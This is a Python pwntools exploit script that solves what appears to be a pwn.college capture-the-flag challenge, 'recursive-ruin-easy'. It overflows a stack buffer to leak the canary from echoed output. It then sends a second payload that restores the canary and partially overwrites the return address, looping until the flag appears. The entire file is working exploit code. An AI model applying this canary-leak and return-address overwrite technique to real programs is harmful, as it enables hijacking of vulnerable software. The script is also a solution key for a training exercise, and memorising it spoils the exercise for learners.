#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/recursive-ruin-easy')
def get_canary(data,length):
    regex = rb"REPEAT[a]{1,40}[\x00-\xff]{7}"
    match = re.findall(regex, data)[0]
    canary = int.from_bytes(b"\x00" + match[length:],'little')
    return canary

base_pointer = 0x7ffc637f8430
input_start = base_pointer - 0x20
input_end = base_pointer - 0x10
canary_add = base_pointer - 8
ret_add = base_pointer + 8
buffer_size = input_end - input_start
space_till_canary = canary_add - input_end
remainig_till_flag = ret_add - canary_add - 8


payload = b"REPEAT" + b'a' * (buffer_size - 6 + space_till_canary + 1)

while 1:
    io = process()

    d1 = io.recvuntil(b"Payload size:")
    io.sendline(str(len(payload)).encode())

    d2 = io.recvuntil(b"Send your payload (up to")
    io.sendline(payload)

    data = io.recvuntil(b"Backdoor triggered! Repeating challenge()")
    canary = get_canary(data,len(payload))


    payload2 = b'a' * (buffer_size + space_till_canary + 1) + p64(canary) + b'a' * remainig_till_flag + b'\x6e\x2e'
    
    d3 = io.recvuntil(b'Payload size:')
    io.send(str(len(payload2)).encode())


    io.send(payload2)
    data = io.recvall()

    if b"pwn.college" in data:
        print(data.decode())
        break
    io.close()

